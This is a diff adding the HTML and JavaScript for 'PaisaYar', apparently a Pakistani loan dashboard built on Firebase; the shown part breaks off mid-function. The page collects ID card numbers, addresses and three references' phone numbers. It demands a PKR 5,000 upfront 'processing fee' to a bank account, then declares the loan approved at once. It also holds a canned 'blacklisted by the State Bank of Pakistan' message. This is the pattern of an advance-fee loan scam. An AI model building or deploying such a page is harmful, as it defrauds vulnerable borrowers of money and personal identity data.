@@ -1,0 +1,1608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PaisaYar - Loan Dashboard</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore-compat.js"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #00a65a;
+            --primary-dark: #008d4c;
+            --primary-light: #e0f2e9;
+            --secondary-color: #f39c12;
+            --dark-color: #222;
+            --light-color: #f8f9fa;
+            --border-radius: 8px;
+            --box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            background-color: #f5f7fa;
+            color: #444;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 30px auto;
+            background: white;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            font-size: 2.5rem;
+            color: var(--primary-dark);
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+        
+        .logo p {
+            color: #666;
+            font-size: 1rem;
+        }
+        
+        h1, h2, h3 {
+            color: var(--primary-dark);
+        }
+        
+        h2 {
+            margin-bottom: 20px;
+            text-align: center;
+            position: relative;
+            padding-bottom: 10px;
+        }
+        
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 3px;
+            background: var(--primary-color);
+        }
+        
+        .form-section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .form-section.active {
+            display: block;
+        }
+        
+        input, button, select, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 166, 90, 0.2);
+        }
+        
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        button:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+        
+        button:focus:not(:active)::after {
+            animation: ripple 0.6s ease-out;
+        }
+        
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(20, 20);
+                opacity: 0;
+            }
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .step {
+            text-align: center;
+            flex: 1;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background-color: #ddd;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #666;
+            transition: var(--transition);
+            border: 3px solid white;
+            box-shadow: 0 0 0 2px #ddd;
+        }
+        
+        .step.active .step-number {
+            background-color: var(--primary-color);
+            color: white;
+            box-shadow: 0 0 0 2px var(--primary-color);
+        }
+        
+        .step.completed .step-number {
+            background-color: var(--primary-dark);
+            color: white;
+            box-shadow: 0 0 0 2px var(--primary-dark);
+        }
+        
+        .step.completed .step-number::after {
+            content: '\f00c';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+        }
+        
+        .step-label {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .step.active .step-label {
+            color: var(--primary-dark);
+            font-weight: 600;
+        }
+        
+        .step:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            width: 100%;
+            height: 2px;
+            background-color: #ddd;
+            z-index: -1;
+            transition: var(--transition);
+        }
+        
+        .step.completed:not(:last-child)::after {
+            background-color: var(--primary-dark);
+        }
+        
+        .error {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: -5px;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 30px;
+            background-color: var(--primary-light);
+            color: var(--primary-dark);
+            border-radius: var(--border-radius);
+            margin-top: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .success-message i {
+            font-size: 50px;
+            color: var(--primary-dark);
+            margin-bottom: 20px;
+        }
+        
+        .success-message h2 {
+            margin-bottom: 15px;
+            color: var(--primary-dark);
+        }
+        
+        .success-message p {
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .id-upload-container {
+            margin-bottom: 20px;
+        }
+        
+        .id-upload-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .id-upload-box {
+            border: 2px dashed #ddd;
+            border-radius: var(--border-radius);
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .id-upload-box:hover {
+            border-color: var(--primary-color);
+            background-color: rgba(0, 166, 90, 0.05);
+        }
+        
+        .id-upload-box i {
+            font-size: 40px;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        
+        .id-upload-box p {
+            margin-bottom: 5px;
+            color: #666;
+        }
+        
+        .id-upload-box small {
+            color: #999;
+            font-size: 12px;
+        }
+        
+        #idPreviewFront, #idPreviewBack {
+            max-width: 100%;
+            margin-top: 15px;
+            border-radius: var(--border-radius);
+            border: 1px solid #ddd;
+            display: none;
+        }
+        
+        .preview-container {
+            position: relative;
+            display: inline-block;
+        }
+        
+        .remove-image {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            opacity: 0;
+            transition: var(--transition);
+        }
+        
+        .preview-container:hover .remove-image {
+            opacity: 1;
+        }
+        
+        .payment-info {
+            background-color: var(--primary-light);
+            padding: 20px;
+            border-radius: var(--border-radius);
+            margin-bottom: 25px;
+            border-left: 4px solid var(--primary-color);
+        }
+        
+        .payment-info h3 {
+            margin-top: 0;
+            margin-bottom: 15px;
+            color: var(--primary-dark);
+            display: flex;
+            align-items: center;
+        }
+        
+        .payment-info h3 i {
+            margin-right: 10px;
+        }
+        
+        .payment-info p {
+            margin-bottom: 10px;
+            color: #444;
+        }
+        
+        .jazzcash-number {
+            font-size: 22px;
+            font-weight: bold;
+            text-align: center;
+            color: var(--primary-dark);
+            margin: 15px 0;
+            padding: 10px;
+            background-color: white;
+            border-radius: var(--border-radius);
+            border: 1px solid var(--primary-color);
+            display: inline-block;
+            width: 100%;
+        }
+        
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .back-button {
+            background-color: #e74c3c;
+        }
+        
+        .back-button:hover {
+            background-color: #c0392b;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .reference-section {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+        }
+        
+        .reference-section h3 {
+            margin-top: 0;
+            margin-bottom: 15px;
+            color: var(--primary-dark);
+        }
+        
+        .blacklist-message {
+            text-align: center;
+            padding: 30px;
+            background-color: #f8d7da;
+            color: #721c24;
+            border-radius: var(--border-radius);
+            margin-top: 20px;
+            animation: fadeIn 0.5s ease;
+            border-left: 4px solid #dc3545;
+            display: none;
+        }
+        
+        .repayment-details {
+            background-color: #e2f3f8;
+            padding: 20px;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+            border-left: 4px solid #17a2b8;
+        }
+        
+        .repayment-details h3 {
+            color: #17a2b8;
+        }
+        
+        .dashboard {
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .dashboard-card {
+            background: white;
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--box-shadow);
+        }
+        
+        .dashboard-card h3 {
+            margin-top: 0;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px dashed #eee;
+        }
+        
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        
+        .info-label {
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .info-value {
+            font-weight: 600;
+            color: var(--primary-dark);
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .status-approved {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        
+        .status-pending {
+            background-color: #fff3cd;
+            color: #856404;
+        }
+        
+        .status-blacklisted {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        
+        .reference-item {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-bottom: 15px;
+        }
+        
+        .reference-item h4 {
+            margin-top: 0;
+            color: var(--primary-dark);
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+            margin-bottom: 10px;
+        }
+        
+        .reference-details {
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .reference-contact {
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .reference-number {
+            font-weight: 600;
+            color: var(--primary-dark);
+        }
+        
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .dashboard-title {
+            margin: 0;
+        }
+        
+        .user-email {
+            font-size: 16px;
+            color: #666;
+        }
+        
+        .get-loan-container {
+            text-align: center;
+            margin: 40px 0;
+        }
+        
+        .get-loan-btn {
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            display: inline-block;
+        }
+        
+        .no-loan-message {
+            text-align: center;
+            padding: 30px;
+            background-color: #f8f9fa;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                margin: 15px;
+                padding: 20px;
+            }
+            
+            .step-label {
+                font-size: 12px;
+            }
+            
+            .logo h1 {
+                font-size: 2rem;
+            }
+            
+            .info-row {
+                flex-direction: column;
+            }
+            
+            .info-value {
+                margin-top: 5px;
+            }
+            
+            .reference-details {
+                flex-direction: column;
+            }
+            
+            .dashboard-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .user-email {
+                margin-top: 10px;
+            }
+            
+            .get-loan-btn {
+                width: 100%;
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1><i class="fas fa-hand-holding-usd"></i> PaisaYar</h1>
+            <p>Your trusted financial partner</p>
+        </div>
+
+        <!-- Dashboard Section (Default View) -->
+        <div id="dashboard-section" class="dashboard">
+            <div class="dashboard-header">
+                <h1 class="dashboard-title"><i class="fas fa-tachometer-alt"></i> Loan Dashboard</h1>
+                <div class="user-email" id="user-email"></div>
+            </div>
+            
+            <div id="active-loan-section">
+                <!-- Active loan details will be shown here -->
+            </div>
+            
+            <div id="no-loan-section" class="no-loan-message">
+                <i class="fas fa-wallet" style="font-size: 50px; color: var(--primary-color); margin-bottom: 20px;"></i>
+                <h2>No Active Loan</h2>
+                <p>You currently don't have any active loan applications.</p>
+                <div class="get-loan-container">
+                    <button id="get-loan-btn" class="get-loan-btn"><i class="fas fa-plus-circle"></i> Get Loan</button>
+                </div>
+            </div>
+            
+            <div class="blacklist-message" id="dashboard-blacklist-message" style="display: none;">
+                <i class="fas fa-exclamation-triangle"></i>
+                <h2>Account Blacklisted</h2>
+                <p>Your account has been flagged by the State Bank of Pakistan.</p>
+                <p>Please contact State Bank of Pakistan immediately to resolve this issue.</p>
+                <p><i class="fas fa-phone"></i> Contact: 111-727-111</p>
+            </div>
+        </div>
+
+        <!-- Registration Section -->
+        <div id="registration-section" class="form-section">
+            <h2>Create Your Account</h2>
+            <form id="registration-form">
+                <div class="form-group">
+                    <input type="email" id="reg-email" placeholder="Email Address" required>
+                </div>
+                <div class="form-group">
+                    <input type="text" id="reg-mobile" placeholder="Mobile Number (e.g., 03001234567)" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="reg-password" placeholder="Password (min 6 characters)" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="reg-confirm-password" placeholder="Confirm Password" required>
+                </div>
+                <button type="submit"><i class="fas fa-user-plus"></i> Register</button>
+                <p style="text-align: center; margin-top: 15px;">Already have an account? <a href="#" id="show-login" style="color: var(--primary-color); font-weight: 500;">Login here</a></p>
+                <p class="error" id="reg-error"></p>
+            </form>
+        </div>
+
+        <!-- Login Section -->
+        <div id="login-section" class="form-section">
+            <h2>Welcome Back</h2>
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="email" id="login-email" placeholder="Email Address" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="login-password" placeholder="Password" required>
+                </div>
+                <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
+                <p style="text-align: center; margin-top: 15px;">Don't have an account? <a href="#" id="show-register" style="color: var(--primary-color); font-weight: 500;">Register here</a></p>
+                <p class="error" id="login-error"></p>
+            </form>
+        </div>
+
+        <!-- Loan Application Form -->
+        <div id="application-section" class="form-section">
+            <h1>PKR 50,000 Loan Application</h1>
+            <div class="step-indicator">
+                <div class="step active" id="step1-indicator">
+                    <div class="step-number">1</div>
+                    <div class="step-label">Personal Info</div>
+                </div>
+                <div class="step" id="step2-indicator">
+                    <div class="step-number">2</div>
+                    <div class="step-label">ID Verification</div>
+                </div>
+                <div class="step" id="step3-indicator">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Payment</div>
+                </div>
+                <div class="step" id="step4-indicator">
+                    <div class="step-number">4</div>
+                    <div class="step-label">Confirmation</div>
+                </div>
+            </div>
+
+            <!-- Step 1: Personal Information -->
+            <div id="step1" class="form-section active">
+                <h2>Personal Information</h2>
+                <form id="personal-info-form">
+                    <div class="form-group">
+                        <input type="text" id="full-name" placeholder="Full Name" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="id-card-number" placeholder="ID Card Number" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="residence-address" placeholder="Residence Address" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="mobile-number" placeholder="Mobile Number" required>
+                    </div>
+                    
+                    <div class="reference-section">
+                        <h3><i class="fas fa-users"></i> References (3 Required)</h3>
+                        <div class="form-group">
+                            <input type="text" id="ref1-name" placeholder="Reference 1 Name" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref1-contact" placeholder="Reference 1 Contact Number" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref2-name" placeholder="Reference 2 Name" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref2-contact" placeholder="Reference 2 Contact Number" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref3-name" placeholder="Reference 3 Name" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref3-contact" placeholder="Reference 3 Contact Number" required>
+                        </div>
+                    </div>
+                    
+                    <div class="nav-buttons">
+                        <button type="button" id="next-to-step2"><i class="fas fa-arrow-right"></i> Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Step 2: ID Verification -->
+            <div id="step2" class="form-section">
+                <h2>ID Card Verification</h2>
+                <form id="id-verification-form">
+                    <div class="id-upload-container">
+                        <label class="id-upload-label">ID Card Front Side:</label>
+                        <div class="id-upload-box" id="front-upload-box">
+                            <input type="file" id="id-front" accept="image/*" style="display: none;">
+                            <i class="fas fa-id-card"></i>
+                            <p>Click to view Front Side of ID Card</p>
+                            <small>For verification purposes only</small>
+                        </div>
+                        <div class="preview-container">
+                            <img id="idPreviewFront" alt="Front ID Preview">
+                            <div class="remove-image" id="remove-front"><i class="fas fa-times"></i></div>
+                        </div>
+                    </div>
+                    
+                    <div class="id-upload-container">
+                        <label class="id-upload-label">ID Card Back Side:</label>
+                        <div class="id-upload-box" id="back-upload-box">
+                            <input type="file" id="id-back" accept="image/*" style="display: none;">
+                            <i class="fas fa-id-card"></i>
+                            <p>Click to view Back Side of ID Card</p>
+                            <small>For verification purposes only</small>
+                        </div>
+                        <div class="preview-container">
+                            <img id="idPreviewBack" alt="Back ID Preview">
+                            <div class="remove-image" id="remove-back"><i class="fas fa-times"></i></div>
+                        </div>
+                    </div>
+                    
+                    <div class="nav-buttons">
+                        <button type="button" id="back-to-step1" class="back-button"><i class="fas fa-arrow-left"></i> Back</button>
+                        <button type="button" id="next-to-step3"><i class="fas fa-arrow-right"></i> Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Step 3: Payment -->
+            <div id="step3" class="form-section">
+                <h2>Payment Verification</h2>
+                <div class="payment-info">
+                    <h3><i class="fas fa-money-bill-wave"></i> Payment Instructions</h3>
+                    <p>To process your PKR 50,000 loan application, a mandatory processing fee of PKR 5,000 is required.</p>
+                    <p><strong>Please send the payment to our JazzCash number:</strong></p>
+                    <div class="Upaisa Bank">
+                        <i class="fas fa-mobile-alt"></i> PK41UMBL0000032124035614
+                    </div>
+                    <p>After making the payment, please enter the transaction ID below.</p>
+                </div>
+                
+                <form id="payment-form">
+                    <div class="form-group">
+                        <input type="text" id="transaction-id" placeholder="Enter JazzCash Transaction ID" required>
+                        <p class="error" id="transaction-error" style="display: none;">This transaction ID has already been used.</p>
+                    </div>
+                    
+                    <div class="nav-buttons">
+                        <button type="button" id="back-to-step2" class="back-button"><i class="fas fa-arrow-left"></i> Back</button>
+                        <button type="button" id="next-to-step4"><i class="fas fa-paper-plane"></i> Submit Application</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Step 4: Confirmation -->
+            <div id="step4" class="form-section">
+                <div class="success-message">
+                    <i class="fas fa-check-circle"></i>
+                    <h2>Application Submitted Successfully!</h2>
+                    <p>Your loan application for PKR 50,000 has been approved.</p>
+                    
+                    <div class="repayment-details">
+                        <h3><i class="fas fa-hand-holding-usd"></i> Repayment Details</h3>
+                        <p><strong>Loan Amount:</strong> PKR 50,000</p>
+                        <p><strong>Repayment Amount:</strong> PKR 55,800 (after 30 days)</p>
+                        <p><strong>Processing Fee:</strong> PKR 5,000 (already paid)</p>
+                        <p><strong>Total to Repay:</strong> PKR 55,800</p>
+                        <p><strong>Repayment Due Date:</strong> <span id="due-date"></span></p>
+                    </div>
+                    
+                    <p>The loan amount will be transferred to your account within 24 hours.</p>
+                    <button type="button" id="view-dashboard" class="dashboard-button"><i class="fas fa-tachometer-alt"></i> View Dashboard</button>
+                </div>
+                
+                <div class="blacklist-message" id="blacklist-message">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <h2>Account Blacklisted</h2>
+                    <p>Your account has been flagged by the State Bank of Pakistan.</p>
+                    <p>Please contact State Bank of Pakistan immediately to resolve this issue.</p>
+                    <p><i class="fas fa-phone"></i> Contact: 111-727-111</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA8CU9LY-54uLzLn_aibvx4C4VpTdDRJ84",
+            authDomain: "paisayar-loan.firebaseapp.com",
+            projectId: "paisayar-loan",
+            storageBucket: "paisayar-loan.appspot.com",
+            messagingSenderId: "240150963871",
+            appId: "1:240150963871:web:ba7fb66c5fd91be94564aa",
+            measurementId: "G-8SBTBZG1VD"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        // DOM Elements
+        const registrationSection = document.getElementById('registration-section');
+        const loginSection = document.getElementById('login-section');
+        const applicationSection = document.getElementById('application-section');
+        const dashboardSection = document.getElementById('dashboard-section');
+        const activeLoanSection = document.getElementById('active-loan-section');
+        const noLoanSection = document.getElementById('no-loan-section');
+        const blacklistMessage = document.getElementById('blacklist-message');
+        const dashboardBlacklistMessage = document.getElementById('dashboard-blacklist-message');
+        const dueDateElement = document.getElementById('due-date');
+        const getLoanBtn = document.getElementById('get-loan-btn');
+        
+        const showLoginLink = document.getElementById('show-login');
+        const showRegisterLink = document.getElementById('show-register');
+        const viewDashboardBtn = document.getElementById('view-dashboard');
+        
+        const registrationForm = document.getElementById('registration-form');
+        const loginForm = document.getElementById('login-form');
+        const regError = document.getElementById('reg-error');
+        const loginError = document.getElementById('login-error');
+        
+        // Application steps
+        const steps = {
+            step1: document.getElementById('step1'),
+            step2: document.getElementById('step2'),
+            step3: document.getElementById('step3'),
+            step4: document.getElementById('step4')
+        };
+        
+        const stepIndicators = {
+            step1: document.getElementById('step1-indicator'),
+            step2: document.getElementById('step2-indicator'),
+            step3: document.getElementById('step3-indicator'),
+            step4: document.getElementById('step4-indicator')
+        };
+        
+        // Navigation buttons
+        const nextToStep2 = document.getElementById('next-to-step2');
+        const nextToStep3 = document.getElementById('next-to-step3');
+        const nextToStep4 = document.getElementById('next-to-step4');
+        
+        const backToStep1 = document.getElementById('back-to-step1');
+        const backToStep2 = document.getElementById('back-to-step2');
+        
+        // ID verification elements
+        const idFrontInput = document.getElementById('id-front');
+        const idBackInput = document.getElementById('id-back');
+        const frontUploadBox = document.getElementById('front-upload-box');
+        const backUploadBox = document.getElementById('back-upload-box');
+        const idPreviewFront = document.getElementById('idPreviewFront');
+        const idPreviewBack = document.getElementById('idPreviewBack');
+        const removeFront = document.getElementById('remove-front');
+        const removeBack = document.getElementById('remove-back');
+        
+        // Transaction ID validation
+        const transactionIdInput = document.getElementById('transaction-id');
+        const transactionError = document.getElementById('transaction-error');
+        
+        // Dashboard elements
+        const userEmailElement = document.getElementById('user-email');
+        
+        // Form data
+        let userData = {
+            personalInfo: {},
+            paymentInfo: {}
+        };
+        
+        // Current user
+        let currentUser = null;
+        let applicationId = '';
+        let dueDate = null;
+
+        // Toggle between registration and login
+        showLoginLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            registrationSection.classList.remove('active');
+            loginSection.classList.add('active');
+            regError.textContent = '';
+        });
+        
+        showRegisterLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            loginSection.classList.remove('active');
+            registrationSection.classList.add('active');
+            loginError.textContent = '';
+        });
+        
+        // Get Loan button
+        getLoanBtn.addEventListener('click', () => {
+            dashboardSection.classList.remove('active');
+            applicationSection.classList.add('active');
+        });
+        
+        // View dashboard button
+        viewDashboardBtn.addEventListener('click', () => {
+            applicationSection.classList.remove('active');
+            dashboardSection.classList.add('active');
+            updateDashboard();
+        });
+        
+        // Registration form submission
+        registrationForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('reg-email').value;
+            const password = document.getElementById('reg-password').value;
+            const confirmPassword = document.getElementById('reg-confirm-password').value;
+            const mobile = document.getElementById('reg-mobile').value;
+            
+            if (password !== confirmPassword) {
+                regError.textContent = 'Passwords do not match!';
+                return;
+            }
+            
+            if (password.length < 6) {
+                regError.textContent = 'Password must be at least 6 characters!';
+                return;
+            }
+            
+            // Create user with Firebase Auth
+            auth.createUserWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    // Save additional user data to Firestore
+                    return db.collection('users').doc(userCredential.user.uid).set({
+                        email: email,
+                        mobile: mobile,
+                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                })
+                .then(() => {
+                    alert('Registration successful! Please login.');
+                    registrationSection.classList.remove('active');
+                    loginSection.classList.add('active');
+                    registrationForm.reset();
+                    regError.textContent = '';
+                })
+                .catch((error) => {
+                    regError.textContent = error.message;
+                });
+        });
+        
+        // Login form submission
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            
+            auth.signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    currentUser = userCredential.user;
+                    loginSection.classList.remove('active');
+                    dashboardSection.classList.add('active');
+                    loginForm.reset();
+                    loginError.textContent = '';
+                    
+                    // Check if user has active loan
+                    checkActiveLoan();
+                })
+                .catch((error) => {
+                    loginError.textContent = error.message;
+                });
+        });
+        
+        // Check for active loan
+        function checkActiveLoan() {
+            if (!currentUser) return;
+            
+            db.collection('loanApplications').doc(currentUser.uid).get()
+                .then((doc) => {
+                    if (doc.exists) {
+                        // User has an active loan
+                        noLoanSection.style.display = 'none';
+                        activeLoanSection.style.display = 'block';
+                        
+                        // Populate active loan details
+                        const loanData = doc.data();
+                        applicationId = loanData.applicationId;
+                        dueDate = loanData.dueDate.toDate();
+                        userData.personalInfo = loanData.personalInfo;
+                        userData.paymentInfo = loanData.paymentInfo;
+                        
+                        // Update dashboard with loan details
+                        updateDashboard();
+                    } else {
+                        // No active loan
+                        noLoanSection.style.display = 'block';
+                        activeLoanSection.style.display = 'none';
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error checking loan:', error);
+                });
+        }
+        
+        // ID verification box click handlers
+        frontUploadBox.addEventListener('click', () => idFrontInput.click());
+        backUploadBox.addEventListener('click', () => idBackInput.click());
+        
+        // ID image preview (local only - no upload)
+        idFrontInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                if (file.size > 2 * 1024 * 1024) {
+                    alert('Image should be less than 2MB');
+                    return;
+                }
+                
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    idPreviewFront.src = event.target.result;
+                    idPreviewFront.style.display = 'block';
+                    
+                    // Reset error styling
+                    frontUploadBox.style.borderColor = '#ddd';
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+        
+        idBackInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                if (file.size > 2 * 1024 * 1024) {
+                    alert('Image should be less than 2MB');
+                    return;
+                }
+                
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    idPreviewBack.src = event.target.result;
+                    idPreviewBack.style.display = 'block';
+                    
+                    // Reset error styling
+                    backUploadBox.style.borderColor = '#ddd';
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+        
+        // Remove image handlers
+        removeFront.addEventListener('click', (e) => {
+            e.stopPropagation();
+            idPreviewFront.style.display = 'none';
+            idFrontInput.value = '';
+        });
+        
+        removeBack.addEventListener('click', (e) => {
+            e.stopPropagation();
+            idPreviewBack.style.display = 'none';
+            idBackInput.value = '';
+        });
+        
+        // Step navigation
+        nextToStep2.addEventListener('click', () => {
+            if (validateStep1()) {
+                // Save personal info
+                userData.personalInfo = {
+                    fullName: document.getElementById('full-name').value,
+                    idCardNumber: document.getElementById('id-card-number').value,
+                    residenceAddress: document.getElementById('residence-address').value,
+                    mobileNumber: document.getElementById('mobile-number').value,
+                    references: [
+                        {
+                            name: document.getElementById('ref1-name').value,
+                            contact: document.getElementById('ref1-contact').value
+                        },
+                        {
+                            name: document.getElementById('ref2-name').value,
+                            contact: document.getElementById('ref2-contact').value
+                        },
+                        {
+                            name: document.getElementById('ref3-name').value,
+                            contact: document.getElementById('ref3-contact').value
+                        }
+                    ]
+                };
+                
+                steps.step1.classList.remove('active');
+                steps.step2.classList.add('active');
+                
+                stepIndicators.step1.classList.remove('active');
+                stepIndicators.step1.classList.add('completed');
+                stepIndicators.step2.classList.add('active');
+            }
+        });
+        
+        nextToStep3.addEventListener('click', () => {
+            if (validateStep2()) {
+                steps.step2.classList.remove('active');
+                steps.step3.classList.add('active');
+                
+                stepIndicators.step2.classList.remove('active');
+                stepIndicators.step2.classList.add('completed');
+                stepIndicators.step3.classList.add('active');
+            }
+        });
+
+        nextToStep4.addEventListener('click', async () => {
+            if (!(await validateStep3())) return;
+
+            const submitButton = document.getElementById('next-to-step4');
+            const originalText = submitButton.innerHTML;
+            submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+            submitButton.disabled = true;
+
+            try {
+                // Generate application ID
+                applicationId = 'PAY-' + new Date().getFullYear() + 
+                               ('0' + (new Date().getMonth() + 1)).slice(-2) +
+                               ('0' + new Date().getDate()).slice(-2) +
+                               Math.floor(1000 + Math.random() * 9000);
+                
+                // Set repayment due date (30 days from now)
+                dueDate = new Date();
+                dueDate.setDate(dueDate.getDate() + 30);
